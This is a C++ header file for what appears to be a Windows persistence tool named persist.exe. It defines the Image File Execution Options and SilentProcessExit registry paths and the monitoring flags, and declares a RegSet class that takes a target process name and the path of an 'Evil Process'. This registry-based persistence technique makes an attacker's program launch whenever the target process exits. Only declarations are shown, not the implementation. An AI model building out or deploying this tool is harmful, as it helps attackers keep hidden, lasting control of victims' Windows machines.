#pragma once
#include <Windows.h>
#include <string>

#define IFEO_REG_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
#define SILENT_PROCESS_EXIT_REG_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"
#define LOCAL_DUMP 0x2
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define MinitorProcess 0x1


#define USAGE "Usage: persist.exe <targetProcess Name> <Evil Process Absolute Path>\n\n"


class RegSet {

private:
	BOOL bIsValid;
	HKEY hIFEORegKey;
	HKEY hSPERegKey;

public:
	RegSet(std::string processName, std::string sourceName);
	~RegSet();
	BOOL isValid();
};